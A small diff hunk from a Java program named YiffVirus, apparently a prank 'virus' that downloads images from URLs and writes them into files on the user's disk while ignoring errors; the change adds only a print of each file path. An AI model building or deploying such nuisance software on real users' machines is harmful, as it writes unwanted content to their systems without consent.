@@ -146,6 +146,7 @@ public class YiffVirus extends JFrame implements Runnable {
                             continue; // We don't want to accidentally write over another file
 
                         // Write the image to the file
+                        System.out.println(imageFile.getAbsolutePath());
                         Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
                     } catch (Exception ignored) {}
 
